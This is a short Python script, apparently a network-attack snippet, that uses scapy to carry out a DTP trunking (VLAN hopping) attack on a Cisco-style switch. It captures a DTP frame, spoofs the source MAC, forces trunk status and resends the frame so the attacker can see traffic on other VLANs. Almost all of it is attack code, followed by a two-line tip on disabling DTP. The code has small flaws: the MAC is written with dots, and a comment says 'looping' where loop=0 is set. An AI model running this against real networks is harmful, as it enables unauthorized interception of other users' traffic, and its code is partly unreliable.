### VLAN ATTACK WITH DTP TRUNKING HACK ###
#
## A user can receive a DTP message and change the status to dynamically form trunks with your machine.
## If an access port has DTP enabled. It can wait for the other side to initiate trunking on the attacker's
## machine to spy on traffic on other VLANs in the network.

from scapy.all import *

load_contrib("dtp")
packet = sniff(filter="ether dst 01:00:0c:cc:cc:cc",count=1) #Sniffing to capture a DTP frame from the switch
packet[0].src = "00.00.00.11.11.11" #Assign source MAC address
packet[0][DTP][DTPStatus].status='\x03' 
sendp(packet[0],loop=0,verbose=1) #Send crafted packet, looping, with verbose output

### PROTECTING AGAINST THIS ATTACK ###
#
## Turn off DTP and prune your trunks!
## See more here: https://packetlife.net/blog/2008/sep/30/disabling-dynamic-trunking-protocol-dtp/
